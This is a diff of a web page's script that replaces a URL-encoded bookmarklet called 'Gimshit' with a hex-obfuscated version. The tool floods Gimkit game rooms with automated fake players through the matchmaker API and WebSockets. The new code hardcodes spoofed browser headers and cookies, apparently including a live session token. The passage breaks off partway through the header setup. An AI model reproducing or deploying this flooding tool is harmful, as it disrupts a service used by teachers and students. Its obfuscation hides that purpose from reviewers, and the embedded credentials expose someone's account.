@@ -8,7 +8,131 @@
 
        <script>
 function bot() {
- (function()%7Bconst apiInfo%3D%7BinfoFromCode%3A"https%3A%2F%2Fwww.gimkit.com%2Fapi%2Fmatchmaker%2Ffind-info-from-code"%2CmatchMaker%3A"https%3A%2F%2Fwww.gimkit.com%2Fapi%2Fmatchmaker%2Fjoin"%7D%2CfindRoomInfo%3Dasync t%3D>%7Blet e%3Dawait fetch(apiInfo.infoFromCode%2C%7Bmethod%3A"post"%2Cheaders%3A%7B"Content-Type"%3A"application%2Fjson"%7D%2Cbody%3AJSON.stringify(%7Bcode%3AString(t)%7D)%7D)%3Breturn e.json()%7D%2CgetIntent%3Dasync(t%2Ce)%3D>%7Blet o%3Dawait findRoomInfo(e)%2Cn%3Dawait fetch(apiInfo.matchMaker%2C%7Bmethod%3A"post"%2Cheaders%3A%7B"Content-Type"%3A"application%2Fjson"%7D%2Cbody%3AJSON.stringify(%7BroomId%3Ao.roomId%2Cname%3At%2CclientType%3A%60Gimkit %E2%81%A1%E2%80%8D%E2%81%A4%E2%80%8D%E2%81%A1%E2%80%8C%E2%80%8D%E2%81%A2%E2%80%8D%E2%81%A2%E2%80%8D%E2%81%A1%E2%80%8C%E2%80%8D%E2%81%A2%E2%81%A1%E2%81%A4%E2%80%8D%E2%80%8D%E2%80%8D%E2%81%A1%E2%81%A2%E2%80%8D%E2%81%A2%E2%81%A1%E2%80%8D%E2%80%8C%E2%80%8D%E2%80%8C%E2%80%8D%E2%81%A1%E2%81%A1%E2%81%A1%E2%80%8D%E2%80%8D%E2%80%8C%E2%81%A2%E2%81%A1%E2%81%A2%E2%81%A1%E2%81%A1%E2%81%A1%E2%80%8D%E2%81%A3%E2%80%8C%E2%80%8D%E2%80%8C%E2%81%A1%E2%81%A4%E2%80%8D%E2%80%8C%E2%80%8D%E2%81%A1%E2%81%A4%E2%81%A1%E2%81%A2%E2%81%A1%E2%81%A2%E2%81%A1%E2%80%8D%E2%81%A2%E2%80%8D%E2%80%8D%E2%81%A2%E2%81%A3%E2%81%A1%E2%80%8C%E2%81%A2%E2%80%8D%E2%81%A3%E2%80%8C%E2%81%A1%E2%80%8D%E2%81%A3%E2%81%A1%E2%80%8C%E2%81%A1%E2%81%A1%E2%81%A2%E2%80%8D%E2%80%8C%E2%81%A4%E2%81%A2%E2%80%8D%E2%80%8C%E2%81%A2%E2%81%A1%E2%80%8D%E2%81%A1%E2%81%A1%E2%80%8D%E2%81%A2%E2%80%8D%E2%81%A2%E2%80%8C%E2%81%A1%E2%81%A2%E2%81%A3%E2%81%A1%E2%80%8C%E2%81%A1%E2%81%A4%E2%80%8D%E2%81%A1%E2%81%A1%E2%80%8C%E2%80%8D%E2%81%A2%E2%81%A3%E2%81%A2%E2%81%A1%E2%80%8D%E2%81%A1%E2%81%A3%E2%80%8D%E2%80%8D%E2%81%A2%E2%81%A1%E2%81%A1%E2%80%8D%E2%80%8D%E2%81%A1%E2%80%8C%E2%81%A4%E2%81%A1%E2%80%8C%E2%81%A2%E2%81%A1%E2%81%A2%E2%80%8D%E2%81%A1%E2%80%8C%E2%80%8D%E2%81%A2%E2%80%8C%E2%81%A2%E2%81%A1%E2%80%8D%E2%80%8C%E2%81%A2%E2%81%A1%E2%81%A2%E2%80%8C%E2%81%A1%E2%80%8C%E2%81%A2%E2%80%8D%E2%80%8D%E2%80%8D%E2%81%A1%E2%81%A3%E2%81%A2%E2%80%8D%E2%80%8C%E2%80%8D%E2%81%A1%E2%80%8D%E2%80%8C%E2%81%A2%E2%80%8C%E2%81%A2%E2%81%A1%E2%81%A1%E2%80%8C%E2%81%A2%E2%81%A3%E2%80%8C%E2%81%A4%E2%81%A2%E2%81%A1%E2%80%8D%E2%80%8D%E2%81%A1%E2%80%8D%E2%81%A2%E2%81%A1%E2%81%A2%E2%81%A1%E2%81%A3%E2%81%A1%E2%80%8C%E2%81%A1%E2%80%8D%E2%81%A1%E2%81%A1%E2%81%A3%E2%80%8D%E2%81%A4%E2%81%A2%E2%81%A1%E2%81%A2%E2%80%8D%E2%81%A1%E2%81%A4%E2%80%8C%E2%81%A1%E2%81%A4%E2%80%8C%E2%81%A1%E2%81%A1%E2%80%8D%E2%80%8D%E2%80%8D%E2%80%8D%E2%80%8D%E2%80%8C%E2%81%A2%E2%81%A1%E2%81%A1%E2%80%8D%E2%80%8D%E2%81%A2%E2%80%8C%E2%80%8D%E2%80%8C%E2%80%8D%E2%81%A2%E2%80%8D%E2%81%A2%E2%81%A1%E2%81%A1%E2%81%A2%E2%81%A1%E2%80%8C%E2%81%A1%E2%80%8C%E2%81%A1%E2%81%A1%E2%80%8C%E2%80%8D%E2%81%A1%E2%81%A2%E2%80%8D%E2%80%8C%E2%81%A1%E2%81%A2%E2%80%8C%E2%80%8D%E2%81%A3%E2%80%8D%E2%80%8C%E2%81%A4%E2%81%A1%E2%81%A1%E2%80%8D%E2%81%A1%E2%80%8D%E2%81%A2%E2%80%8D%E2%81%A3%E2%80%8D%E2%81%A3%E2%81%A4%E2%80%8C%E2%80%8D%E2%80%8D%E2%81%A3%E2%81%A1%E2%80%8C%E2%80%8D%E2%80%8C%E2%81%A1%E2%81%A2%E2%81%A1%E2%81%A4%E2%80%8D%E2%81%A4%E2%81%A1%E2%81%A2%E2%81%A1%E2%80%8C%E2%80%8D%E2%81%A1%E2%81%A2%E2%80%8D%E2%80%8D%E2%80%8D%E2%80%8C%E2%80%8D%E2%80%8D%E2%80%8C%E2%81%A2%E2%80%8D%E2%81%A2%E2%80%8D%E2%81%A2%E2%80%8C%E2%81%A1%E2%80%8D%E2%80%8C%E2%81%A1%E2%80%8C%E2%81%A4%E2%80%8D%E2%81%A1Web Client V3.1%60%7D)%7D)%3Breturn n.json()%7D%2Cjoin%3Dasync(t%2Ce)%3D>%7Blet o%3Dawait getIntent(e%2Ct)%2Cn%3D%60%24%7Bo.serverUrl%7D%2Fmatchmake%2FjoinById%2F%24%7Bo.roomId%7D%60%2Ca%3Dawait fetch(n%2C%7Bmethod%3A"post"%2Cheaders%3A%7B"Content-Type"%3A"application%2Fjson"%7D%2Cbody%3AJSON.stringify(%7BintentId%3Ao.intentId%7D)%7D)%2Cr%3Dawait a.json()%2Cs%3D%60%24%7Bo.serverUrl.replace("https"%2C"wss")%7D%2F%24%7Br.room.processId%7D%2F%24%7Br.room.roomId%7D%3FsessionId%3D%24%7Br.sessionId%7D%60%2Cd%3Dnew WebSocket(s)%3Bd.addEventListener("open"%2C()%3D>!0)%7D%2Cgui%3Ddocument.createElement("div")%3Bgui.id%3D"gui"%2Cgui.innerHTML%3D%60%0A    <h1 id%3D"title">Gimshit<%2Fh1>%0A    <div id%3D"inputs">%0A        <input placeholder%3D"Pin" id%3D"code"><%2Finput>%0A        <input placeholder%3D"Names" id%3D"names"><%2Finput>%0A        <input type%3D"number" maxlength%3D"100" placeholder%3D"Amount" id%3D"amount" ><%2Finput>%0A        <button id%3D"floodButton">Flood<%2Fbutton>%0A    <%2Fdiv>%0A%60%2Cdocument.body.append(gui)%3Bconst style%3Ddocument.createElement("style")%3Bstyle.innerText%3D%60%0A    %23gui %7B%0A        width%3A 21rem%3B%0A        height%3A 21rem%3B%0A        border%3A 0.2rem solid %230f2c65%3B%0A        border-radius%3A 0.2rem%3B%0A        position%3A absolute%3B%0A        z-index%3A 9%3B%0A        box-shadow%3A 2px 4px 18px rgba(0%2C 0%2C 0%2C 0.2)%3B%0A        transition%3A border-color 0.2s%2C box-shadow 0.2s%3B%0A        position%3A absolute%3B%0A        top%3A 30%25%3B%0A        left%3A 40%25%3B%0A        background-color%3A white%3B%0A    %7D%0A    %3A%3Aplaceholder %7B%0A        text-align%3A center%3B%0A        font-size%3A large%3B%0A    %7D%0A    %23title%7B%0A        -webkit-text-size-adjust%3A 100%25%3B%0A        -webkit-tap-highlight-color%3A rgba(0%2C0%2C0%2C0)%3B%0A        --antd-wave-shadow-color%3A %231890ff%3B%0A        --scroll-bar%3A 0%3B%0A        font-feature-settings%3A "tnum"%2C"tnum"%3B%0A        font-family%3A GimkitSF%2C sans-serif%3B%0A        color%3A rgb(0%2C 0%2C 0)%3B%0A        font-variant%3A normal !important%3B%0A        box-sizing%3A border-box%3B%0A        overflow-wrap%3A break-word%3B%0A        font-size%3A 20px%3B%0A        font-weight%3A 800%3B%0A        line-height%3A 1%3B%0A        display%3A flex%3B%0A        justify-content%3A center%3B%0A        margin-top%3A 10%25%3B%0A    %7D%0A    %23inputs%7B%0A        margin%3A 0%3B%0A        position%3A absolute%3B%0A        top%3A 50%25%3B%0A        left%3A 50%25%3B%0A        transform%3A translate(-50%25%2C -50%25)%3B%0A        text-align%3A center%3B%0A        z-index%3A -999999%3B%0A%0A    %7D%0A%0A    %23inputs>input%7B%0A        display%3A flex%3B%0A        align-self%3A center%3B%0A        padding%3A 0px%3B%0A        border%3A 2px solid GREY%3B%0A        outline%3A none%3B%0A        margin-top%3A 5px%3B%0A        border-radius%3A 5px%3B%0A        font-size%3A 15px%3B%0A        z-index%3A 999999%3B%0A    %7D%0A    %23inputs>button%7B%0A        margin-top%3A 5px%3B%0A        -webkit-text-size-adjust%3A 100%25%3B%0A        -webkit-tap-highlight-color%3A rgba(0%2C0%2C0%2C0)%3B%0A        --antd-wave-shadow-color%3A %231890ff%3B%0A        --scroll-bar%3A 0%3B%0A        line-height%3A 1.5%3B%0A        font-feature-settings%3A "tnum"%2C"tnum"%3B%0A        font-family%3A "Product Sans"%3B%0A        font-variant%3A normal !important%3B%0A        overflow-wrap%3A break-word%3B%0A        box-sizing%3A border-box%3B%0A        padding%3A 8px 13px%3B%0A        font-size%3A 12px%3B%0A        background%3A rgb(30%2C 7%2C 107)%3B%0A        color%3A white%3B%0A        transition%3A background 0.2s ease 0s%3B%0A        border-radius%3A 7px%3B%0A        font-weight%3A bold%3B%0A        text-align%3A center%3B%0A        display%3A inline-block%3B%0A        user-select%3A none%3B%0A        cursor%3A pointer%3B%0A        margin%3A auto%3B%0A        width%3A 50%25%3B%0A        margin-top%3A 3%25%3B%0A    %7D%0A%60%2Cdocument.head.appendChild(style)%3Bconst flood%3Ddocument.getElementById("floodButton")%3Bflood.onclick%3Dasync()%3D>%7Blet t%3Ddocument.getElementById("names").value%2Ce%3Ddocument.getElementById("amount").value%2Co%3Ddocument.getElementById("code").value%3Bfor(gui.remove()%2Ci%3D0%3Bi<e%3Bi%2B%2B)await join(o%2Ct)%7D%3B%7D)()%3B
+var _0xb32b = ["\x43\x6F\x64\x65", "\x41\x63\x63\x65\x70\x74", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A", "\x61\x70\x70\x65\x6E\x64", "\x41\x63\x63\x65\x70\x74\x2D\x4C\x61\x6E\x67\x75\x61\x67\x65", "\x65\x6E\x2D\x55\x53\x2C\x65\x6E\x3B\x71\x3D\x30\x2E\x39", "\x43\x61\x63\x68\x65\x2D\x43\x6F\x6E\x74\x72\x6F\x6C", "\x6E\x6F\x2D\x63\x61\x63\x68\x65", "\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E", "\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65", "\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E", "\x43\x6F\x6F\x6B\x69\x65", "\x5F\x5F\x73\x74\x72\x69\x70\x65\x5F\x6D\x69\x64\x3D\x64\x62\x64\x62\x36\x62\x34\x34\x2D\x66\x62\x35\x38\x2D\x34\x31\x34\x35\x2D\x61\x61\x31\x61\x2D\x32\x33\x63\x62\x64\x32\x66\x64\x64\x33\x36\x36\x62\x37\x31\x31\x37\x31\x3B\x20\x5F\x67\x61\x3D\x47\x41\x31\x2E\x31\x2E\x31\x30\x36\x38\x38\x39\x31\x36\x36\x30\x2E\x31\x36\x38\x32\x36\x38\x38\x37\x31\x38\x3B\x20\x61\x6D\x70\x6C\x69\x74\x75\x64\x65\x5F\x69\x64\x5F\x38\x30\x31\x35\x63\x63\x32\x37\x36\x37\x66\x64\x62\x30\x39\x65\x39\x64\x33\x30\x30\x35\x39\x63\x36\x38\x37\x65\x66\x36\x32\x31\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D\x3D\x65\x79\x4A\x6B\x5A\x58\x5A\x70\x59\x32\x56\x4A\x5A\x43\x49\x36\x49\x6A\x59\x77\x4E\x6D\x55\x35\x4D\x7A\x41\x77\x4C\x54\x52\x68\x4F\x57\x59\x74\x4E\x44\x52\x6D\x4E\x79\x31\x68\x4F\x44\x59\x7A\x4C\x54\x63\x7A\x5A\x44\x49\x7A\x4D\x57\x59\x79\x59\x32\x59\x32\x4D\x6C\x49\x69\x4C\x43\x4A\x31\x63\x32\x56\x79\x53\x57\x51\x69\x4F\x6D\x35\x31\x62\x47\x77\x73\x49\x6D\x39\x77\x64\x45\x39\x31\x64\x43\x49\x36\x5A\x6D\x46\x73\x63\x32\x55\x73\x49\x6E\x4E\x6C\x63\x33\x4E\x70\x62\x32\x35\x4A\x5A\x43\x49\x36\x4D\x54\x59\x34\x4E\x6A\x41\x33\x4E\x44\x41\x32\x4D\x54\x41\x32\x4F\x43\x77\x69\x62\x47\x46\x7A\x64\x45\x56\x32\x5A\x57\x35\x30\x56\x47\x6C\x74\x5A\x53\x49\x36\x4D\x54\x59\x34\x4E\x6A\x41\x33\x4E\x44\x41\x32\x4D\x54\x41\x32\x4F\x43\x77\x69\x5A\x58\x5A\x6C\x62\x6E\x52\x4A\x5A\x43\x49\x36\x4E\x43\x77\x69\x61\x57\x52\x6C\x62\x6E\x52\x70\x5A\x6E\x6C\x4A\x5A\x43\x49\x36\x4D\x43\x77\x69\x63\x32\x56\x78\x64\x57\x56\x75\x59\x32\x56\x4F\x64\x57\x31\x69\x5A\x58\x49\x69\x4F\x6A\x52\x39\x3B\x20\x5F\x67\x61\x5F\x33\x32\x4B\x4A\x43\x52\x54\x42\x46\x33\x3D\x47\x53\x31\x2E\x31\x2E\x31\x36\x38\x36\x33\x33\x35\x30\x33\x33\x2E\x38\x2E\x30\x2E\x31\x36\x38\x36\x33\x33\x35\x30\x33\x33\x2E\x30\x2E\x30\x2E\x30\x3B\x20\x5F\x5F\x73\x74\x72\x69\x70\x65\x5F\x73\x69\x64\x3D\x31\x61\x36\x31\x65\x62\x30\x65\x2D\x65\x62\x61\x30\x2D\x34\x66\x63\x37\x2D\x61\x64\x36\x35\x2D\x63\x34\x39\x64\x61\x35\x63\x36\x36\x39\x63\x66\x62\x33\x34\x61\x36\x36", "\x4F\x72\x69\x67\x69\x6E", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D", "\x50\x72\x61\x67\x6D\x61", "\x52\x65\x66\x65\x72\x65\x72", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D\x2F\x6A\x6F\x69\x6E", "\x53\x65\x63\x2D\x46\x65\x74\x63\x68\x2D\x44\x65\x73\x74", "\x65\x6D\x70\x74\x79", "\x53\x65\x63\x2D\x46\x65\x74\x63\x68\x2D\x4D\x6F\x64\x65", "\x63\x6F\x72\x73", "\x53\x65\x63\x2D\x46\x65\x74\x63\x68\x2D\x53\x69\x74\x65", "\x73\x61\x6D\x65\x2D\x6F\x72\x69\x67\x69\x6E", "\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74", "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x4D\x61\x63\x69\x6E\x74\x6F\x73\x68\x3B\x20\x49\x6E\x74\x65\x6C\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x20\x31\x30\x5F\x31\x35\x5F\x37\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x31\x31\x33\x2E\x30\x2E\x30\x2E\x30\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36", "\x73\x65\x63\x2D\x63\x68\x2D\x75\x61", "\x22\x47\x6F\x6F\x67\x6C\x65\x20\x43\x68\x72\x6F\x6D\x65\x22\x3B\x76\x3D\x22\x31\x31\x33\x22\x2C\x20\x22\x43\x68\x72\x6F\x6D\x69\x75\x6D\x22\x3B\x76\x3D\x22\x31\x31\x33\x22\x2C\x20\x22\x4E\x6F\x74\x2D\x41\x2E\x42\x72\x61\x6E\x64\x22\x3B\x76\x3D\x22\x32\x34\x22", "\x73\x65\x63\x2D\x63\x68\x2D\x75\x61\x2D\x6D\x6F\x62\x69\x6C\x65", "\x3F\x30", "\x73\x65\x63\x2D\x63\x68\x2D\x75\x61\x2D\x70\x6C\x61\x74\x66\x6F\x72\x6D", "\x22\x6D\x61\x63\x4F\x53\x22", "\x73\x74\x72\x69\x6E\x67\x69\x66\x79", "\x50\x4F\x53\x54", "\x66\x6F\x6C\x6C\x6F\x77", "\x65\x72\x72\x6F\x72\x20\x66\x69\x6E\x64\x20\x69\x6E\x66\x6F", "\x6C\x6F\x67", "\x63\x61\x74\x63\x68", "\x70\x61\x72\x73\x65", "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x4D\x61\x63\x69\x6E\x74\x6F\x73\x68\x3B\x20\x49\x6E\x74\x65\x6C\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x20\x31\x30\x2E\x31\x35\x3B\x20\x72\x76\x3A\x31\x30\x39\x2E\x30\x29\x20\x47\x65\x63\x6B\x6F\x2F\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6F\x78\x2F\x31\x31\x34\x2E\x30", "\x65\x6E\x2D\x55\x53\x2C\x65\x6E\x3B\x71\x3D\x30\x2E\x35", "\x41\x63\x63\x65\x70\x74\x2D\x45\x6E\x63\x6F\x64\x69\x6E\x67", "\x67\x7A\x69\x70\x2C\x20\x64\x65\x66\x6C\x61\x74\x65\x2C\x20\x62\x72", "\x5F\x67\x61\x3D\x47\x41\x31\x2E\x31\x2E\x36\x34\x36\x31\x39\x37\x33\x32\x36\x2E\x31\x36\x36\x34\x35\x35\x35\x30\x37\x34\x3B\x20\x5F\x5F\x73\x74\x72\x69\x70\x65\x5F\x6D\x69\x64\x3D\x38\x62\x64\x39\x65\x36\x32\x39\x2D\x31\x30\x31\x63\x2D\x34\x62\x62\x63\x2D\x39\x66\x33\x65\x2D\x66\x66\x65\x35\x64\x37\x30\x64\x65\x64\x63\x38\x30\x37\x33\x30\x38\x38\x3B\x20\x61\x6D\x70\x6C\x69\x74\x75\x64\x65\x5F\x69\x64\x5F\x38\x30\x31\x35\x63\x63\x32\x37\x36\x37\x66\x64\x62\x30\x39\x65\x39\x64\x33\x30\x30\x35\x39\x63\x36\x38\x37\x65\x66\x36\x32\x31\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D\x3D\x65\x79\x4A\x6B\x5A\x58\x5A\x70\x59\x32\x56\x4A\x5A\x43\x49\x36\x49\x6D\x5A\x68\x5A\x54\x6C\x68\x5A\x6D\x45\x7A\x4C\x54\x4E\x69\x4E\x44\x6B\x74\x4E\x44\x51\x32\x4F\x53\x31\x69\x59\x7A\x4D\x79\x4C\x54\x68\x6D\x4D\x44\x46\x6D\x4D\x54\x4D\x7A\x4D\x57\x51\x77\x5A\x56\x49\x69\x4C\x43\x4A\x31\x63\x32\x56\x79\x53\x57\x51\x69\x4F\x6D\x35\x31\x62\x47\x77\x73\x49\x6D\x39\x77\x64\x45\x39\x31\x64\x43\x49\x36\x5A\x6D\x46\x73\x63\x32\x55\x73\x49\x6E\x4E\x6C\x63\x33\x4E\x70\x62\x32\x35\x4A\x5A\x43\x49\x36\x4D\x54\x59\x34\x4E\x6A\x4D\x7A\x4D\x54\x67\x33\x4E\x44\x45\x7A\x4E\x69\x77\x69\x62\x47\x46\x7A\x64\x45\x56\x32\x5A\x57\x35\x30\x56\x47\x6C\x74\x5A\x53\x49\x36\x4D\x54\x59\x34\x4E\x6A\x4D\x7A\x4D\x6A\x6B\x31\x4E\x44\x59\x79\x4D\x69\x77\x69\x5A\x58\x5A\x6C\x62\x6E\x52\x4A\x5A\x43\x49\x36\x4D\x79\x77\x69\x61\x57\x52\x6C\x62\x6E\x52\x70\x5A\x6E\x6C\x4A\x5A\x43\x49\x36\x4D\x43\x77\x69\x63\x32\x56\x78\x64\x57\x56\x75\x59\x32\x56\x4F\x64\x57\x31\x69\x5A\x58\x49\x69\x4F\x6A\x4E\x39\x3B\x20\x47\x5F\x45\x4E\x41\x42\x4C\x45\x44\x5F\x49\x44\x50\x53\x3D\x67\x6F\x6F\x67\x6C\x65\x3B\x20\x5F\x67\x61\x5F\x33\x32\x4B\x4A\x43\x52\x54\x42\x46\x33\x3D\x47\x53\x31\x2E\x31\x2E\x31\x36\x38\x36\x33\x33\x31\x38\x35\x38\x2E\x32\x36\x2E\x31\x2E\x31\x36\x38\x36\x33\x33\x34\x32\x36\x34\x2E\x30\x2E\x30\x2E\x30\x3B\x20\x63\x6F\x6E\x6E\x65\x63\x74\x2E\x73\x69\x64\x3D\x73\x25\x33\x41\x78\x76\x50\x39\x76\x53\x4B\x62\x6E\x36\x62\x6B\x6E\x74\x47\x57\x53\x79\x55\x4C\x37\x68\x75\x4E\x7A\x64\x5A\x5F\x7A\x77\x37\x69\x2E\x6B\x5A\x77\x4F\x45\x37\x71\x41\x25\x32\x42\x45\x47\x35\x62\x50\x50\x5A\x77\x54\x53\x7A\x4B\x78\x77\x6F\x64\x58\x30\x4B\x68\x4D\x43\x53\x69\x45\x52\x69\x53\x4D\x25\x32\x46\x68\x45\x55\x6F\x3B\x20\x5F\x5F\x73\x74\x72\x69\x70\x65\x5F\x73\x69\x64\x3D\x63\x62\x31\x62\x31\x35\x32\x66\x2D\x64\x30\x61\x32\x2D\x34\x35\x34\x35\x2D\x38\x65\x64\x36\x2D\x30\x37\x61\x37\x38\x31\x62\x35\x31\x63\x34\x34\x36\x33\x64\x65\x61\x31", "\x72\x6F\x6F\x6D\x49\x64", "\x43\x68\x61\x73\x65\x4C\x65\x69\x67\x68\x54\x68\x75\x67\x48\x61\x63\x6B\x65\x72", "\x47\x69\x6D\x6B\x69\x74\x20\x57\x65\x62\x20\u2062\u200D\u2061\u200C\u2061\u2062\u2061\u200D\u2064\u2062\u2061\u2062\u2062\u200C\u2062\u200C\u200C\u200D\u200C\u200C\u2061\u2062\u200D\u2062\u200C\u200C\u200C\u200D\u200C\u2062\u2064\u2061\u2062\u2063\u200D\u2061\u200D\u2061\u2062\u2062\u2061\u2063\u2062\u2062\u200C\u2062\u2063\u200D\u2061\u200C\u2063\u2061\u2063\u2061\u200C\u200C\u200D\u2062\u2061\u200D\u2062\u200C\u2063\u2063\u2062\u200D\u200C\u2061\u2063\u2061\u2062\u2061\u200C\u2062\u2062\u2062\u200C\u2064\u200C\u200C\u2061\u200C\u2063\u200D\u200C\u200D\u2061\u2062\u2061\u2062\u200C\u2062\u200D\u200C\u2064\u200D\u2064\u2062\u200D\u2062\u2064\u2062\u2061\u2062\u2061\u2062\u200C\u200C\u2061\u2063\u200D\u2062\u200C\u2063\u2062\u2061\u200C\u200C\u2061\u200D\u200C\u2061\u200D\u2061\u2062\u2062\u2061\u2063\u2062\u200C\u2064\u2061\u2062\u2063\u2062\u2061\u200C\u200C\u2062\u200C\u200D\u200C\u200C\u2062\u200D\u2062\u200D\u200C\u2064\u2063\u200C\u2061\u200C\u200C\u2062\u200C\u200D\u2061\u2062\u200C\u200C\u200D\u2062\u200D\u200C\u200C\u200C\u200D\u200C\u2061\u2063\u2062\u2062\u200D\u200C\u2062\u2062\u2061\u2062\u2062\u200C\u2061\u200D\u2064\u200D\u2062\u200C\u200C\u2064\u200C\u2062\u200C\u200D\u200C\u2061\u2063\u200C\u2063\u2062\u2062\u2062\u200D\u2061\u2062\u2063\u2062\u200C\u2062\u2064\u200C\u2062\u2062\u2062\u2061\u2062\u2062\u2061\u2062\u200D\u2061\u200C\u200D\u2061\u2062\u2062\u200D\u2062\u2061\u200C\u2062\u200C\u2062\u2064\u2062\u2063\u2061\u2062\u2062\u200C\u2061\u200C\u2062\u200C\u2061\u200C\u2061\u2062\u2061\u200D\u2062\u2061\u200C\u2062\u2062\u200C\u200C\u2063\u2062\u2062\u200C\u2061\u200D\u2062\u2063\u2062\u200D\u2064\u200D\u2062\u2063\u2064\u2064\u2062\u2061\u200D\u200C\u2062\u2064\u2062\u2064\u200D\u2061\u200D\u2061\u200D\u2062\u200D\x43\x6C\x69\x65\x6E\x74\x20\x56\x33\x2E\x31", "\x65\x72\x72\x6F\x72\x20\x6D\x61\x74\x63\x68\x6D\x61\x6B\x69\x6E\x67", "\x69\x6E\x74\x65\x6E\x74\x49\x64", "\x65\x6E\x2D\x55\x53\x2C\x65\x6E\x3B\x71\x3D\x30\x2E\x38", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D\x2F", "\x63\x72\x6F\x73\x73\x2D\x73\x69\x74\x65", "\x53\x65\x63\x2D\x47\x50\x43", "\x31", "\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x4D\x61\x63\x69\x6E\x74\x6F\x73\x68\x3B\x20\x49\x6E\x74\x65\x6C\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x20\x31\x30\x5F\x31\x35\x5F\x37\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x43\x68\x72\x6F\x6D\x65\x2F\x31\x31\x34\x2E\x30\x2E\x30\x2E\x30\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36", "\x22\x4E\x6F\x74\x2E\x41\x2F\x42\x72\x61\x6E\x64\x22\x3B\x76\x3D\x22\x38\x22\x2C\x20\x22\x43\x68\x72\x6F\x6D\x69\x75\x6D\x22\x3B\x76\x3D\x22\x31\x31\x34\x22\x2C\x20\x22\x42\x72\x61\x76\x65\x22\x3B\x76\x3D\x22\x31\x31\x34\x22", "\x2F", "\x73\x70\x6C\x69\x74", "\x68\x74\x74\x70\x73\x3A\x2F\x2F", "\x73\x65\x72\x76\x65\x72\x55\x72\x6C", "\x65\x72\x72\x6F\x72\x20\x6A\x6F\x69\x6E", "\x63\x6C\x69\x65\x6E\x74\x73", "\x72\x6F\x6F\x6D", "\x77\x73\x73\x3A\x2F\x2F", "\x70\x72\x6F\x63\x65\x73\x73\x49\x64", "\x3F\x73\x65\x73\x73\x69\x6F\x6E\x49\x64\x3D", "\x73\x65\x73\x73\x69\x6F\x6E\x49\x64", "\x6F\x6E\x6D\x65\x73\x73\x61\x67\x65", "\x52\x65\x63\x65\x69\x76\x65\x64\x20\x6D\x65\x73\x73\x61\x67\x65\x3A", "\x64\x61\x74\x61", "\x6C\x65\x6E\x67\x74\x68", "\x73\x75\x62\x73\x74\x72\x69\x6E\x67", "\x30\x61", "\x73\x65\x6E\x64", "\x74\x68\x65\x6E", "\x74\x65\x78\x74", "\x2F\x6D\x61\x74\x63\x68\x6D\x61\x6B\x65\x2F\x6A\x6F\x69\x6E\x42\x79\x49\x64\x2F", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x6D\x61\x74\x63\x68\x6D\x61\x6B\x65\x72\x2F\x6A\x6F\x69\x6E", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x69\x6D\x6B\x69\x74\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x6D\x61\x74\x63\x68\x6D\x61\x6B\x65\x72\x2F\x66\x69\x6E\x64\x2D\x69\x6E\x66\x6F\x2D\x66\x72\x6F\x6D\x2D\x63\x6F\x64\x65"];
+var code = prompt(_0xb32b[0]);
+
+function api() {
+	var _0x3047x3 = new Headers();
+	_0x3047x3[_0xb32b[3]](_0xb32b[1], _0xb32b[2]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[4], _0xb32b[5]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[6], _0xb32b[7]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[8], _0xb32b[9]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[10], _0xb32b[11]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[12], _0xb32b[13]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[14], _0xb32b[15]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[16], _0xb32b[7]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[17], _0xb32b[18]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[19], _0xb32b[20]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[21], _0xb32b[22]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[23], _0xb32b[24]);
